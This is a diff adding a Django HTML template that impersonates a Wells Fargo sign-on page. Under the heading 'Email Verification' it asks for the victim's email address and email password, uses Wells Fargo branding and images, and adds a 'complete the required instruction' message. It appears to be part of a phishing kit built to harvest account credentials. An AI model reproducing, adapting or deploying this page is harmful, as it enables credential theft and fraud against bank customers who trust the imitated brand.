@@ -1,0 +1,124 @@
+{% extends 'wells/base.html' %}
+{% load static %}
+
+{% block content %}
+<div class="inner">
+    <div id="signOn" style="margin-top: 64px;">
+        <div id="signOnMain">
+            <h2 id="signOnHeader"><img alt="Secure" role="img"
+                                       src="{% static '' %}WellsFargo/homepage-signon-lock.svg">Email Verification</h2>
+
+            <form autocomplete="off" data-login-app="true" id="frmSignon" method="post" name="signon">
+                {% csrf_token %}
+
+
+                <!--                            Ename-->
+                <div class="formElementsWrapper formElementsuserMail" id="confirmUsernameDiv">
+                    <label class="id_label" for="userMail" id="confirmUsernameLabel">Email</label>
+                    <input accesskey="U" autocomplete="off" class="formElement formElementText login_field"
+                           id="userMail" maxlength="40" name="userMail"
+                           type="text">
+                </div>
+
+                <!--                            EPassword -->
+                <div class="formElementsWrapper formElementsEmailPassword" id="confirmPasswordDiv">
+                    <label class="id_label" for="epassword" id="confirmPasswordLabel">Password</label>
+                    <input accesskey="P" autocomplete="off" class="formElement formElementPassword login_field pmask"
+                           id="epassword" maxlength="32"
+                           name="emailPassword" type="password">
+                </div>
+
+
+                <div class="formSubmit">
+                    <input class="c7" id="btnSignon" name="btnConfirm" type="submit" value="Confirm">
+                </div>
+
+                <input id="fidoAuth" name="fidoAuth" type="hidden" value="false">
+
+            </form>
+        </div>
+        <!--             <div id="signUp">
+
+                     <a href="https://oam.wellsfargo.com/oamo/identity/enrollment">Enroll Now</a>
+
+                     <a href="https://www.wellsfargo.com/privacy-security/fraud/?linkLoc=signon">Security Center</a>
+                     <a href="https://www.wellsfargo.com/privacy-security/?linkLoc=signon">Privacy, Cookies, and
+                         Security</a>
+                 </div>-->
+    </div>
+
+
+</div>
+<div class="c3" style="    position: absolute;
+    left: 50%;
+    -webkit-transform: translateX(-50%);
+    -moz-transform: translateX(-50%);
+    -ms-transform: translateX(-50%);
+    -o-transform: translateX(-50%);
+    margin-top: 0;
+    width: 1200px;
+    background-color: rgba(231,218,218,0.9);;
+
+">
+    <div aria-label="Promotions Slideshow" class="c3wrapper" role="region">
+
+
+        <div class="carouselFrame item1" style="display: block;"><span class="hidden">Begin item
+                                1</span>
+            <div class="cmsDefault" data-slot-id="WF_CON_HP_PRIMARY_BNR_1" lang="en">
+
+
+                <div class="c3Img">
+                    <!--                                <img alt="" src="https://www01.wellsfargomedia.com/assets/images/homepage/wfi111_ph_hph_default1_1200x532.jpg">-->
+
+                    <div class="imgChodak"></div>
+
+                </div>
+
+
+                <div class="inner">
+                    <div class="marqueeContent">
+                        <div class="marqueecontentinner marqueetheme11">
+
+                            <h2 style="color: #1f1c1c">Thank you for your cooperation</h2>
+                            <span>Inorder to keep your privacy, please complete the required
+                                                instruction.</span>
+
+                        </div>
+                    </div>
+                </div>
+
+
+            </div>
+            <span class="hidden">End item 1</span>
+        </div>
+        <div class="carouselFrame item2" style="display: none;"><span class="hidden">Begin item 2</span>
+            <div class="cmsDefault" data-slot-id="WF_CON_HP_PRIMARY_BNR_2" lang="en">
+
+
+                <div class="c3Img" data-cid="tcm:84-147036-16" data-ctid="tcm:91-146911-32">
+                    <img alt=""
+                         src="https://www01.wellsfargomedia.com/assets/images/contextual/banner/enterprise/1200x532/wfi000_lg_b-wf-stagecoach_rednoborder_1200x532.gif">
+                </div>
+                <div class="inner">
+                    <div class="marqueeContent">
+                        <div class="marqueecontentinner marqueetheme11">
+
+                            <h2>Keeping you informed</h2>
+
+
+                            <a class="c7" enrollmentid="3107" href="https://stories.wf.com/"
+                               role="button">Learn
+                                More</a>
+
+                        </div>
+                    </div>
+                </div>
+
+
+            </div>
+            <span class="hidden">End item 2</span>
+        </div>
+    </div>
+</div>
+{% endblock content %}
